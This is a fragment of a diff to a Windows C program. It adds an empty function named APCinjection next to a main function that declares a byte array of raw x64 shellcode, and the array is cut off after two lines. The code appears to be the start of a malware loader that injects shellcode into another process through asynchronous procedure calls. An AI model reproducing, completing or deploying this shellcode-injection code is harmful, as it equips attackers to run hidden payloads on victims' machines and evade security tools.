@@ -1,7 +1,12 @@
 #include <windows.h> 
 #include <stdio.h>
 
-int main(void) {
+
+void APCinjection(){
+
+}
+
+int main(void) { 
     const UCHAR shellcode_64[] = 
         "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xcc\x00\x00\x00\x41"
         "\x51\x41\x50\x52\x48\x31\xd2\x51\x56\x65\x48\x8b\x52\x60"
